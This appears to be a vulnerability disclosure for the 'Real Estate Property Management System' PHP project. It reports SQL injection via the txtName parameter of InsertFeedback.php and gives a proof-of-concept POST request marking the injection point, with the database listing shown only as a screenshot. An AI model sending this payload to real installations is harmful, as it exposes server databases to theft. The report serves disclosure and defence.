# Real Estate Property Management System has sql injection vulnerability  via txtName parameter.

## supplier 
https://code-projects.org/real-estate-property-management-system-php-source-code/
## Vulnerability parameter
txtName parameter.

## describe

An unrestricted SQL injection attack exists in an Real Estate Property Management System. The parameters that can be controlled are as follows: txtName . This function executes the id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analy,sis**    

When the value of   txtName parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![Image](https://github.com/user-attachments/assets/5acfa37a-2fa4-4fa9-8a9c-77bd171ab4cf)

## POC

```
POST /InsertFeedback.php HTTP/1.1
Host: property
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://property
Connection: close
Referer: http://property/ajax_city.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i

txtName=1*
```

**Result**

get databases 

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)
